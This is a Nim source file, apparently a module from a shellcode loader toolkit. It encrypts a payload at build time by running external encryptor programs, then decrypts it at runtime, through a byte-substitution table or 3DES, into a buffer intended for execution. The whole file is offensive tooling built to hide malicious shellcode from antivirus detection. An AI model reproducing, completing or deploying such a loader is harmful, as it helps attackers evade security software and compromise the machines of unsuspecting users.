{.passL:"-static"}
# {.hint[XDeclaredButNotUsed]:off.}
# {.passL:"-D:_WIN32_WINNT=0x0602"}
import strutils

const source {.strdefine.}: string = ""
var code*:cstring
var codelen*:cint = 0
const currsource:string = "\"" & source & "\""

when defined(Caesar):
    import sequtils
    proc caesar(result:string): void =
        let decodres = parseHexStr(result)
        let dic = decodres[0..255].mapIt(it.byte)
        let table = decodres[256..high(decodres)].mapIt(it.byte)
        var deshellcode = newSeq[uint8](table.len)
        var temp:string = ""
        temp.setLen(table.len)
        for i in 0..254:
            for k in 0..high(table):
                temp[k] = cast[cchar](dic[table[k]])
        code = cstring(temp)
        codelen = cast[cint](deshellcode.len)
    const enbase64 = staticExec("encryption\\Caesar.exe " & currsource)
    caesar(enbase64)

elif defined(TDEA):
    {.compile: "encryption\\des.c".}
    proc D3DES_Decrypt(plainBuffer:cstring,keyBuffer:cstring,cipherBuffer:cstring,n:cint):cint {.importc,cdecl.}
    proc de3des(enbase64:string): void =
        let shellcode:string = parseHexStr(enbase64)
        let plain_len_byte = cast[uint32]([shellcode[0],shellcode[1],shellcode[2],shellcode[3]])
        let input_encode:cstring = cstring(shellcode[28..high(shellcode)])
        let key:cstring = cstring(shellcode[4..27])
        code = cast[cstring](alloc0(plain_len_byte));
        discard D3DES_Decrypt(input_encode,key,code,cast[cint](plain_len_byte))
        codelen = cast[cint](plain_len_byte)
    const enbase64 = staticExec("encryption\\Tdea.exe " & currsource)
    de3des(enbase64)